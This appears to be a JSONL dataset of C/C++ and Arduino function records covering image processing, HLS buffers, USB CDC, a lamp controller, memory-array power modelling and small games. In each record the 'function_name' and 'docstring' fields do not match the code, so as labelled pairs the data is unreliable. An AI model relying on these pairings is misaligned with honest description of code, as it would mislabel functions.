{"content":"{'function_name': 'TopPlayerFrame', 'docstring': '\/\/std::cout << bottom << std::endl;', 'code': 'cv::Mat BottomPlayerFrame(cv::Mat src) {\\n\\t\\tcv::Mat dst = src.clone();\\n\\n\\t\\t\/\/ constrains\\n\\t\\tint left = floor((21 * src.cols) \/ 100);\\n\\t\\t\/\/std::cout << left << std::endl;\\n\\t\\tint right = floor((79 * src.cols) \/ 100);\\n\\t\\t\/\/std::cout << right << std::endl;\\n\\t\\tint top = floor((45 * src.rows) \/ 100);\\n\\t\\t\/\/std::cout << top << std::endl;\\n\\t\\tint bottom = floor((94 * src.rows) \/ 100);\\n\\t\\t\/\/std::cout << bottom << std::endl;\\n\\n\\t\\tfor (size_t j = 0; j < src.rows; j++) {\\n\\t\\t\\tfor (size_t i = 0; i < src.cols; i++) {\\n\\t\\t\\t\\tif (j < top || j > bottom) {\\n\\t\\t\\t\\t\\tdst.at<uchar>(j, i) = 255;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tif (i < left || i > right) {\\n\\t\\t\\t\\t\\tdst.at<uchar>(j, i) = 255;\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\treturn dst;\\n\\t}'}","id":658}
{"content":"{'function_name': 'demosaic_diff_rd0_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaic_diff_rd1_select(demosaic_by_cache& demosaic_by, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_diff_rd1 read pattern: { demosaic_diff_update_0[d0, d1] -> demosaic_by[1 + 2d0, d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Read schedule : { demosaic_diff_update_0[d0, d1] -> [5 + d1, 3 + d0, 10] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Write schedule: { demosaic_by_update_0[d0, d1] -> [5 + d1, 3 + d0, 9] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ DD fold: {  }\\n  auto value_demosaic_by_demosaic_by_update_0_write1 = demosaic_by.demosaic_by_demosaic_by_update_0_write1_merged_banks_1.peek(\/* one reader or all rams *\/ 0);\\n  return value_demosaic_by_demosaic_by_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":659}
{"content":"{'function_name': 'init_system_matrix_derivative_toyexample', 'docstring': '\/\/ central elements', 'code': 'NumericVector numerical_solution_derivative_toyexample(NumericVector param, NumericVector pgrad, int nx)\\n{\\n    int kx=0, kml=0;\\n    int nml = 0;\\n    nml = compute_matrix_dimension_toyexample(nx);\\n    NumericVector x(nx);\\n    NumericVector xgrad(nx);\\n    NumericVector b(nx);\\n    NumericVector bgrad(nx);\\n    NumericMatrix mle(nml, 2);\\n    NumericMatrix mle_grad(nml, 2);\\n    b = init_right_part_toyexample(param, nx);\\n    bgrad = init_right_part_derivative_toyexample(param, pgrad, nx);\\n    mle = init_system_matrix_toyexample(param, nx);\\n    mle_grad = init_system_matrix_derivative_toyexample(param, pgrad, nx);\\n    for(kml = 0; kml < nml; kml ++)\\n    {\\n        bgrad[(int)mle_grad(kml, 0)] -= mle_grad(kml, 2) * x[(int)mle_grad(kml, 1)];\\n    }\\n    xgrad = linear_solver_toyexample(mle, bgrad);\\n    \/\/xgrad = linear_solver_direct_toyexample(mle, bgrad);\\n    return xgrad;\\n}'}","id":661}
{"content":"{'function_name': 'on_BinChange', 'docstring': '\/\/\u30107\u3011\u663e\u793a\u76f4\u65b9\u56fe\u7a97\u53e3\\r', 'code': 'int main31( int argc, char** argv)\\r\\n{\\r\\n\\r\\n\\t\/\/\u30101\u3011\u8bfb\u53d6\u6e90\u56fe\u50cf\uff0c\u5e76\u8f6c\u6362\u5230 HSV \u7a7a\u95f4\\r\\n\\tg_srcImage = imread(\"C:\/Users\/sualab\/Desktop\/cow.jpg\", 1);\\r\\n\\tif (!g_srcImage.data) { printf(\"\u8bfb\u53d6\u56fe\u7247\u9519\u8bef\uff0c\u8bf7\u786e\u5b9a\u76ee\u5f55\u4e0b\u662f\u5426\u6709imread\u51fd\u6570\u6307\u5b9a\u56fe\u7247\u5b58\u5728~\uff01 \\\\n\"); return false; }\\r\\n\\tcvtColor(g_srcImage, g_hsvImage, COLOR_BGR2HSV);\\r\\n \\r\\n \/\/------------------------------------------------------------------------\\r\\n\\tg_hueImage.create(g_hsvImage.size(), g_hsvImage.depth());\\r\\n\\tint ch[] = { 0, 0 };\\r\\n\\t\/\/0\u901a\u9053 -- \u5230  -- 0\u901a\u9053\\r\\n\\r\\n\\t\/\/\u91cd\u6392\u56fe\u50cf\u901a\u9053\\r\\n\\t\/\/\u53c2\u65701\uff1a\u8f93\u5165\u7684\u6570\u7ec4\uff0c\u6240\u6709\u7684\u77e9\u9635\u5fc5\u987b\u6709\u76f8\u540c\u7684\u5c3a\u5bf8\u548c\u6df1\u5ea6\uff08\u56fe\u7247\uff09\\r\\n\\t\/\/\u53c2\u65702\uff1a\u7b2c\u4e00\u4e2a\u53c2\u6570\u8f93\u5165\u7684\u77e9\u9635\u6570\uff0c\u8f93\u5165\u56fe\u50cf\u7684\u4e2a\u6570\\r\\n\\t\/\/\u53c2\u65703\uff1a\u8f93\u51fa\u7684\u6570\u7ec4\uff0c\u6240\u6709\u7684\u77e9\u9635\u5fc5\u987b\u6709\u76f8\u540c\u7684\u5c3a\u5bf8\u548c\u6df1\u5ea6\uff08\u56fe\u7247\uff09\\r\\n\\t\/\/\u53c2\u65704\uff1a\u7b2c\u4e09\u4e2a\u53c2\u6570\u8f93\u51fa\u7684\u77e9\u9635\u6570\uff0c\u8f93\u51fa\u56fe\u50cf\u7684\u4e2a\u6570\\r\\n\\tmixChannels(&g_hsvImage, 1, &g_hueImage, 1, ch, 1);\\r\\n\\r\\n\/*\\r\\n\/\/\u5e94\u7528\u5b9e\u4f8b(\u4ee5\u4e0b\u4ee3\u7801\u6f14\u793amixChannels\u7684\u4f7f\u7528\uff09\\r\\n\/\/------------------------------------------------------------------------\\r\\n\\t\/\/\u5c06\u4e00\u4e2a4\u901a\u9053\u7684RGBA\u56fe\u50cf\u8f6c\u5316\u4e3a3\u901a\u9053BGR\u548c\u4e00\u4e2a\u5355\u72ec\u7684Alpha\u901a\u9053\\r\\n\\tMat rgba(100, 100, CV_8UC4, Scalar(1, 2, 3, 4));\\r\\n\\tMat bgr(rgba.rows, rgba.cols, CV_8UC3);\\r\\n\\tMat alpha(rgba.rows, rgba.cols, CV_8UC1);\\r\\n\\r\\n\\r\\n\\tMat out[] = { bgr , alpha };\\r\\n\\t\/\/\u5c06rgba[0] -->bgr[2] , rgba[1] --> bgr[1]\\r\\n\\t\/\/\u5c06rgba[2] -->bgr[0] , rgba[3] --> alpha[0]\\r\\n\\r\\n\\tint from_to[] = { 0,2, 1,1, 2,0, 3,3 };\\r\\n\\tmixChannels(&rgba, 1, out, 2, from_to, 4);\\r\\n*\/\\r\\n\/\/------------------------------------------------------------------------\\r\\n\\r\\n\\t\/\/\u30103\u3011\u521b\u5efa Trackbar \u6765\u8f93\u5165bin\u7684\u6570\u76ee\\r\\n\\tnamedWindow(\"test\", WINDOW_AUTOSIZE);\\r\\n\\tcreateTrackbar(\"\u8272\u8c03\u7ec4\u8ddd \", \"test\", &g_bins, 180, on_BinChange);\\r\\n\\ton_BinChange(0, 0);\/\/\u8fdb\u884c\u4e00\u6b21\u521d\u59cb\u5316\\r\\n\\r\\n\\t\/\/\u30104\u3011\u663e\u793a\u6548\u679c\u56fe\\r\\n\\timshow(\"test\", g_srcImage);\\r\\n\\r\\n    waitKey(0);\\r\\n    \\r\\n\\r\\n\\r\\n    return 0;\\r\\n}'}","id":662}
{"content":"{'function_name': 'demosaic_byb_demosaic_by_update_0_read_bundle_read', 'docstring': '\/\/ demosaic_by_rd1', 'code': 'inline hw_uint<16> cp_noinit_20_2_rd0_select(demosaic_diff_cache& demosaic_diff, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ cp_noinit_20_2_rd0 read pattern: { cp_noinit_20_2_update_0[d0, d1] -> demosaic_diff[2d0, d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Read schedule : { cp_noinit_20_2_update_0[d0, d1] -> [5 + d1, 3 + d0, 11] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Write schedule: { demosaic_diff_update_0[d0, d1] -> [5 + d1, 3 + d0, 10] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ DD fold: {  }\\n  auto value_demosaic_diff_demosaic_diff_update_0_write0 = demosaic_diff.demosaic_diff_demosaic_diff_update_0_write0_merged_banks_1.peek(\/* one reader or all rams *\/ 0);\\n  return value_demosaic_diff_demosaic_diff_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":664}
{"content":"{'function_name': 'CDC_DeInit_FS', 'docstring': '\/* USER CODE END 4 *\/', 'code': 'static int8_t CDC_Control_FS(uint8_t cmd, uint8_t* pbuf, uint16_t length)\\r\\n{\\r\\n    \/* USER CODE BEGIN 5 *\/\\r\\n    switch (cmd)\\r\\n    {\\r\\n    case CDC_SEND_ENCAPSULATED_COMMAND:\\r\\n\\r\\n        break;\\r\\n\\r\\n    case CDC_GET_ENCAPSULATED_RESPONSE:\\r\\n\\r\\n        break;\\r\\n\\r\\n    case CDC_SET_COMM_FEATURE:\\r\\n\\r\\n        break;\\r\\n\\r\\n    case CDC_GET_COMM_FEATURE:\\r\\n\\r\\n        break;\\r\\n\\r\\n    case CDC_CLEAR_COMM_FEATURE:\\r\\n\\r\\n        break;\\r\\n\\r\\n        \/*******************************************************************************\/\\r\\n        \/* Line Coding Structure                                                       *\/\\r\\n        \/*-----------------------------------------------------------------------------*\/\\r\\n        \/* Offset | Field       | Size | Value  | Description                          *\/\\r\\n        \/* 0      | dwDTERate   |   4  | Number |Data terminal rate, in bits per second*\/\\r\\n        \/* 4      | bCharFormat |   1  | Number | Stop bits                            *\/\\r\\n        \/*                                        0 - 1 Stop bit                       *\/\\r\\n        \/*                                        1 - 1.5 Stop bits                    *\/\\r\\n        \/*                                        2 - 2 Stop bits                      *\/\\r\\n        \/* 5      | bParityType |  1   | Number | Parity                               *\/\\r\\n        \/*                                        0 - None                             *\/\\r\\n        \/*                                        1 - Odd                              *\/\\r\\n        \/*                                        2 - Even                             *\/\\r\\n        \/*                                        3 - Mark                             *\/\\r\\n        \/*                                        4 - Space                            *\/\\r\\n        \/* 6      | bDataBits  |   1   | Number Data bits (5, 6, 7, 8 or 16).          *\/\\r\\n        \/*******************************************************************************\/\\r\\n    case CDC_SET_LINE_CODING:\\r\\n\\r\\n        break;\\r\\n\\r\\n    case CDC_GET_LINE_CODING:\\r\\n\\r\\n        break;\\r\\n\\r\\n    case CDC_SET_CONTROL_LINE_STATE:\\r\\n\\r\\n        break;\\r\\n\\r\\n    case CDC_SEND_BREAK:\\r\\n\\r\\n        break;\\r\\n\\r\\n    default:\\r\\n        break;\\r\\n    }\\r\\n\\r\\n    return (USBD_OK);\\r\\n    \/* USER CODE END 5 *\/\\r\\n}'}","id":665}
{"content":"{'function_name': 'httpRequest', 'docstring': \"\/\/Cette fonction permet alors de traiter le JSON re\u00e7u afin de modifier l'\u00e9tat de la lampe\", 'code': 'void demoParse(String input) {\\n  Serial.println(\"parse\");\\n  Serial.println(\"=====\");\\n\\n  JSONVar myObject = JSON.parse(input);\\n\\n  \/\/ JSON.typeof(jsonVar) can be used to get the type of the var\\n  if (JSON.typeof(myObject) == \"undefined\") {\\n    Serial.println(\"Parsing input failed!\");\\n    return;\\n  }\\n\\n  Serial.print(\"JSON.typeof(myObject) = \");\\n  Serial.println(JSON.typeof(myObject)); \/\/ prints: object\\n\\n  \/\/ myObject.hasOwnProperty(key) checks if the object contains an entry for key\\n  if (myObject.hasOwnProperty(\"state\")) {\\n    JSONVar state_var = myObject[\"state\"];\\n    Serial.print(\"state_var[\\\\\"on\\\\\"] = \");\\n    if((bool)state_var[\"on\"] == true){\\n      Serial.println(\"The lamp is on !\");\\n      \/\/Si la lampe est allum\u00e9 alors on \u00e9teint la lampe puis on notifie le changement \u00e0 notre API en envoyant une requ\u00eate HTTP PUT\\n      turnOff();\\n      client.println(\"PUT \/api\/lights\/1\/switch HTTP\/1.1\");\\n      client.println(\"Host: ayoub-springlab.cleverapps.io\");\\n\\n    }\\n    \\n  else{\\n      Serial.println(\"The lamp is off !\");\\n      \/\/ Si la lampe est \u00e9teinte alors on allume la lampe puis on notifie le changement \u00e0 notre API en envoyant une requ\u00eate HTTP PUT\\n      turnOn();\\n      client.println(\"PUT \/api\/lights\/1\/switch HTTP\/1.1\");\\n      client.println(\"Host: ayoub-springlab.cleverapps.io\");\\n      \\n\\n    }\\n    \\n  }\\n\\n\\n  Serial.println();\\n}'}","id":668}
{"content":"{'function_name': 'NeuroSimSubArrayWriteEnergy', 'docstring': '\/\/ Skip this function if param->NeuroSimDynamicPerformance is false', 'code': 'double NeuroSimSubArrayLeakagePower(SubArray *subArray) {\\n    \/\/printf(\"calculating the array leakage power\");\\n\\tif (subArray->cell.memCellType == Type::SRAM) {\\t\/\/ SRAM\\n\\t\\tsubArray->wlDecoder.CalculatePower(1, 1);\\n\\t\\tsubArray->precharger.CalculatePower(1, 1);\\n\\t\\tsubArray->sramWriteDriver.CalculatePower(1);\\n\\t\\tsubArray->senseAmp.CalculatePower(1);\\n\\t\\tsubArray->adder.CalculatePower(1, 1);\\n\\t\\tsubArray->dff.CalculatePower(1, 1);\\n\\t\\tsubArray->subtractor.CalculatePower(1, 1);\\n\\t\\tif (subArray->shiftAddEnable) {\\n\\t\\t\\tsubArray->shiftAdd.CalculatePower(1);\\n\\t\\t}\\n\\t\\t\\n\\t\\t\/\/ Array leakage (assume 2 INV)\\n\\t\\tsubArray->leakage += CalculateGateLeakage(INV, 1, subArray->cell.widthSRAMCellNMOS * subArray->tech.featureSize, subArray->cell.widthSRAMCellPMOS * subArray->tech.featureSize, subArray->inputParameter.temperature, subArray->tech) * subArray->tech.vdd * 2;\\n\\t\\tsubArray->leakage *= subArray->numRow * subArray->numCol;\\n\\n\\t\\tsubArray->leakage += subArray->wlDecoder.leakage;\\n\\t\\tsubArray->leakage += subArray->precharger.leakage;\\n\\t\\tsubArray->leakage += subArray->sramWriteDriver.leakage;\\n\\t\\tsubArray->leakage += subArray->senseAmp.leakage;\\n\\t\\tsubArray->leakage += subArray->adder.leakage;\\n\\t\\tsubArray->leakage += subArray->dff.leakage;\\n\\t\\tsubArray->leakage += subArray->subtractor.leakage;\\n\\t\\tsubArray->leakage += subArray->shiftAdd.leakage;\\n\\n\\t} \\n    else {\\t\/\/ eNVM\\n\\t\\tif (subArray->digitalModeNeuro) {   \/\/ Digital eNVM\\n\\t\\t\\tif (subArray->cell.accessType == CMOS_access) {   \/\/ 1T1R\\n                if (subArray->parallelRead==true)\\n                {                    \\n                    subArray->wlBlSwitchMatrix.CalculatePower(1, 1);\\n                    subArray->slSwitchMatrix.CalculatePower(1, 1);\\n\\t\\t\\t\\t    subArray->mux.CalculatePower(1);\\n\\t\\t\\t\\t    subArray->muxDecoder.CalculatePower(1, 1);\\n                    subArray->readCircuit.CalculatePower(1);\\n\\t\\t\\t\\t    subArray->subtractor.CalculatePower(1, 1);\\n\\t\\t\\t\\t    if (subArray->shiftAddEnable) {\\n\\t\\t\\t\\t\\t    subArray->shiftAdd.CalculatePower(1);\\n\\t\\t\\t\\t     }\\n                    subArray->leakage += subArray->wlBlSwitchMatrix.leakage;\\n                    subArray->leakage += subArray->mux.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->muxDecoder.leakage;\\n                    \\n                    subArray->leakage += subArray->slSwitchMatrix.leakage;\\n                    subArray->leakage += subArray->readCircuit.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->subtractor.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->shiftAdd.leakage;\\n                }\\n                else {\\n                    subArray->wlDecoder.CalculatePower(1, 1);\\n\\t\\t\\t\\t    subArray->colDecoder.CalculatePower(1, 1);\\n\\t\\t\\t\\t    subArray->colDecoderDriver.CalculatePower(1, 1, 1, 1);\\n\\t\\t\\t\\t    subArray->mux.CalculatePower(1);\\n\\t\\t\\t\\t    subArray->muxDecoder.CalculatePower(1, 1);\\n\\t\\t\\t\\t    subArray->voltageSenseAmp.CalculatePower(1);\\n\\t\\t\\t\\t    subArray->adder.CalculatePower(1, 1);\\n\\t\\t\\t\\t    subArray->dff.CalculatePower(1, 1);\\n\\t\\t\\t\\t    subArray->subtractor.CalculatePower(1, 1);\\n\\t\\t\\t\\t    if (subArray->shiftAddEnable) {\\n\\t\\t\\t\\t\\t    subArray->shiftAdd.CalculatePower(1);\\n\\t\\t\\t\\t    }\\n\\t\\t\\t\\t    subArray->leakage += subArray->wlDecoder.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->colDecoder.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->colDecoderDriver.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->mux.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->muxDecoder.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->voltageSenseAmp.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->adder.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->dff.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->subtractor.leakage;\\n\\t\\t\\t\\t    subArray->leakage += subArray->shiftAdd.leakage;\\n                }\\n\\t\\t\\t} else {    \/\/ Cross-point\\n\\t\\t\\t\\tsubArray->wlDecoder.CalculatePower(1, 1);\\n\\t\\t\\t\\tsubArray->wlDecoderDriver.CalculatePower(1, 1, 1, 1);\\n\\t\\t\\t\\tsubArray->colDecoder.CalculatePower(1, 1);\\n\\t\\t\\t\\tsubArray->colDecoderDriver.CalculatePower(1, 1, 1, 1);\\n\\t\\t\\t\\tsubArray->mux.CalculatePower(1);\\n\\t\\t\\t\\tsubArray->muxDecoder.CalculatePower(1, 1);\\n\\t\\t\\t\\tsubArray->voltageSenseAmp.CalculatePower(1);\\n\\t\\t\\t\\tsubArray->adder.CalculatePower(1, 1);\\n\\t\\t\\t\\tsubArray->dff.CalculatePower(1, 1);\\n\\t\\t\\t\\tsubArray->subtractor.CalculatePower(1, 1);\\n\\t\\t\\t\\tif (subArray->shiftAddEnable) {\\n\\t\\t\\t\\t\\tsubArray->shiftAdd.CalculatePower(1);\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tsubArray->leakage += subArray->wlDecoder.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->wlDecoderDriver.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->colDecoder.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->colDecoderDriver.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->mux.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->muxDecoder.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->voltageSenseAmp.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->adder.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->dff.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->subtractor.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->shiftAdd.leakage;\\n\\t\\t\\t}\\n\\t\\t} else {    \/\/ Analog eNVM\\n\\t\\t\\tif (subArray->cell.accessType == CMOS_access) {\\t\/\/ 1T1R\\n\\t\\t\\t\\tsubArray->wlDecoder.CalculatePower(1, 1);\\t\/\/ Don\\'t care numRead and numWrite\\n\\t\\t\\t\\tsubArray->wlDecoderOutput.CalculatePower(1, 1);\\t\/\/ Don\\'t care numRead and numWrite\\n\\t\\t\\t\\tsubArray->blSwitchMatrix.CalculatePower(1, 1);\\t\/\/ Don\\'t care numRead and numWrite\\n\\t\\t\\t\\tsubArray->slSwitchMatrix.CalculatePower(1, 1);\\t\/\/ Don\\'t care numRead and numWrite\\n\\t\\t\\t\\tsubArray->mux.CalculatePower(1);\\t\/\/ Don\\'t care numRead\\n\\t\\t\\t\\tsubArray->muxDecoder.CalculatePower(1, 1);\\t\/\/ Don\\'t care numRead and numWrite\\n\\t\\t\\t\\tsubArray->readCircuit.CalculatePower(1);\\t\/\/ Don\\'t care numRead\\n\\t\\t\\t\\tsubArray->subtractor.CalculatePower(1, 1);\\n\\t\\t\\t\\tif (subArray->shiftAddEnable) {\\n\\t\\t\\t\\t\\tsubArray->shiftAdd.CalculatePower(1);\\t\/\/ Don\\'t care numRead\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tsubArray->leakage += subArray->wlDecoder.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->wlDecoderOutput.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->blSwitchMatrix.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->slSwitchMatrix.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->mux.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->muxDecoder.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->readCircuit.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->subtractor.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->shiftAdd.leakage;\\n\\t\\t\\t} else {\\t\/\/ Cross-point\\n\\t\\t\\t\\tsubArray->wlSwitchMatrix.CalculatePower(1, 1);\\t\/\/ Don\\'t care numRead and numWrite\\n\\t\\t\\t\\tsubArray->blSwitchMatrix.CalculatePower(1, 1);\\t\/\/ Don\\'t care numRead and numWrite\\n\\t\\t\\t\\tsubArray->mux.CalculatePower(1);\\t\/\/ Don\\'t care numRead\\n\\t\\t\\t\\tsubArray->muxDecoder.CalculatePower(1, 1);\\t\/\/ Don\\'t care numRead and numWrite\\n\\t\\t\\t\\tsubArray->readCircuit.CalculatePower(1);\\t\/\/ Don\\'t care numRead\\n\\t\\t\\t\\tsubArray->subtractor.CalculatePower(1, 1);\\n\\t\\t\\t\\tif (subArray->shiftAddEnable) {\\n\\t\\t\\t\\t\\tsubArray->shiftAdd.CalculatePower(1);\\t\/\/ Don\\'t care numRead\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\tsubArray->leakage += subArray->wlSwitchMatrix.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->blSwitchMatrix.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->mux.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->muxDecoder.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->readCircuit.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->subtractor.leakage;\\n\\t\\t\\t\\tsubArray->leakage += subArray->shiftAdd.leakage;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\treturn subArray->leakage;\\n}'}","id":675}
{"content":"{'function_name': 'randomGenerator', 'docstring': '\/\/ Check for Solvability', 'code': 'bool isSolvable(string puzzle)\\t\/\/ Checks Solvability\\n{\\n\\tint puzzleArray[3][3]; \/\/ Multidimensional array\\n\\tint n = 0;\\n\\n\\tfor (int i = 0; i < 3; i++)\\n\\t\\tfor (int j = 0; j < 3; j++)\\n\\t\\t{\\n\\t\\t\\tpuzzleArray[i][j] = puzzle[n];\\n\\t\\t\\tn++;\\n\\t\\t}\\n\\n\\t\/\/ Count inversions in given 8 puzzle\\n\\tint invCount = getInvCount((int *)puzzleArray);\\n\\n\\t\/\/ return true if inversion count is even.\\n\\tif (invCount % 2 == 0)\\n\\t{\\n\\t\\treturn true;\\n\\t}\\n\\telse randomGenerator();\\t\/\/ Search for a Solvable State\\n\\n}'}","id":693}
{"content":"{'function_name': 'moveWhere', 'docstring': '\/\/Captures the grid number of where to move the ship', 'code': 'int fireLocation(void){\\t\\t\\t\/\/Asks the user where to attack\\n\\t\\terase();\\n\\t\\theadsUp(getTurn());\\t\\t\/\/Display heads up\\n\\t\\tcout << \" Please enter the grid number to fire upon! (0-\" << grid-1 << \")\" << endl << endl;\\t\\t\/\/Ask the user to enter the grid in which to fire upon.\\n\\t\\tcin >> fire;\\t\\t\/\/Places the players input into fire\\n\\t\\twhile (fire < 0 || fire > grid-1){\\t\/\/Checks to see if the user is firing on the grid. If not tell the user their input is invalid\\n\\t\\t\\terase();\\n\\t\\t\\theadsUp(getTurn());\\t\\t\/\/Display heads up\\n\\t\\t\\tcout << \" Invalid Input!\" << endl << endl;\\n\\t\\t\\tcout << \" Please enter the grid number to fire upon! (0-\" << grid-1 << \")\" << endl << endl;\\n\\t\\t\\tcin >> fire;\\t\/\/Places the players input into fire\\n\\t\\t}\\n\\t\\treturn fire;\\n}'}","id":695}
{"content":"{'function_name': 'MP_UNGIJOSIKMsgParser', 'docstring': '\/\/SW070127 \ud0c0\uc774\ud0c4', 'code': 'void MP_PETMsgParser(DWORD dwConnectionIndex, char* pMsg, DWORD dwLength)\\n{\\n\\tMSGBASE* pTempMsg = (MSGBASE*)pMsg;\\n\\n\\tCPlayer* pPlayer = (CPlayer*)g_pUserTable->FindUser(pTempMsg->dwObjectID);\\n\\tif(!pPlayer) return;\\n\\n\\tpPlayer->GetPetManager()->NetworkMsgParse( pTempMsg->Protocol, pMsg );\\n\\n\\t\/*\\n\\tCPet* pPet = pPlayer->GetPetManager()->GetCurSummonPet();\\n\\tif(!pPet)\\n\\t{\\n\\t\\tchar buf[256] = {0,};\\n\\t\\tsprintf(buf, \"PlayerID(%d),that have not SummonPet!\", pTempMsg->dwObjectID);\\n\\t\\tASSERTMSG(0, buf);\\n\\t\\treturn;\\n\\t}\\n\\n\\tswitch(pTempMsg->Protocol)\\n\\t{\\t\\n\\tcase MP_PET_REST_ON:\\n\\t\\t{\\n\\t\\t\\tif( FALSE == pPet->IsPetRest() )\\n\\t\\t\\t{\\n\\t\\t\\t\\tpPet->SetPetRest(TRUE);\\n\\t\\t\\t\\tpTempMsg->Protocol = MP_PET_REST_ACK;\\n\\t\\t\\t}\\n\\t\\t\\telse\\n\\t\\t\\t{\\n\\t\\t\\t\\tpTempMsg->Protocol = MP_PET_REST_NACK;\\n\\t\\t\\t\\t\/\/return sync error\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tbreak;\\n\\tcase MP_PET_REST_OFF:\\n\\t\\t{\\n\\t\\t\\tif( TRUE == pPet->IsPetRest() )\\n\\t\\t\\t{\\n\\t\\t\\t\\tpPet->SetPetRest(FALSE);\\n\\t\\t\\t\\tpTempMsg->Protocol = MP_PET_REST_ACK;\\n\\t\\t\\t}\\n\\t\\t\\telse\\n\\t\\t\\t{\\n\\t\\t\\t\\tpTempMsg->Protocol = MP_PET_REST_NACK;\\n\\t\\t\\t\\t\/\/return sync error\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tbreak;\\n\\tcase MP_PET_USE_SKILL_SYN:\\n\\t\\t{\\n\\t\\t\\t\/\/!!!\ud3ab \uc2a4\ud0ac \uac8c\uc774\uc9c0 \uac80\uc0ac\\n\\t\\t\\tif(pPet->UsePetSkill())\\n\\t\\t\\t\\tpTempMsg->Protocol = MP_PET_USE_SKILL_ACK;\\n\\t\\t\\t\/\/return MP_PET_USE_SKILL_ACK\\n\\t\\t}\\n\\t\\tbreak;\\n\\tdefault:\\n\\t\\tASSERT(0);\\n\\t\\tpTempMsg->Protocol = MP_PET_REST_NACK;\\n\\t\\tbreak;\\n\\t}\\n\\n\\tpPlayer->SendMsg(pTempMsg,sizeof(MSGBASE));\\n\\t*\/\\n}'}","id":704}
{"content":"{'function_name': 'VkToPalWaitPipePoint', 'docstring': '\/\/ Check if bottom-of-pipe waiting is enough.', 'code': 'inline uint32_t VkToPalImageCreateFlags(VkImageCreateFlags imageCreateFlags,\\n                                        VkFormat           format,\\n                                        VkImageUsageFlags  imageUsage)\\n{\\n    Pal::ImageCreateFlags flags = {};\\n\\n    flags.cubemap            = (imageCreateFlags & VK_IMAGE_CREATE_CUBE_COMPATIBLE_BIT)        ? 1 : 0;\\n    flags.prt                = (imageCreateFlags & VK_IMAGE_CREATE_SPARSE_RESIDENCY_BIT)       ? 1 : 0;\\n    flags.invariant          = (imageCreateFlags & VK_IMAGE_CREATE_ALIAS_BIT)                  ? 1 : 0;\\n    flags.tmzProtected       = (imageCreateFlags & VK_IMAGE_CREATE_PROTECTED_BIT)              ? 1 : 0;\\n    flags.view3dAs2dArray    = (imageCreateFlags & VK_IMAGE_CREATE_2D_VIEW_COMPATIBLE_BIT_EXT) ? 1 : 0;\\n\\n    \/\/ Always provide pQuadSamplePattern to PalCmdResolveImage for depth formats to allow optimizations\\n    flags.sampleLocsAlwaysKnown = Formats::HasDepth(format) ? 1 : 0;\\n\\n    \/\/ Ignore Flag VK_IMAGE_CREATE_2D_ARRAY_COMPATIBLE_BIT. It is supported by default for all 3D images\\n\\n    return flags.u32All;\\n}'}","id":705}
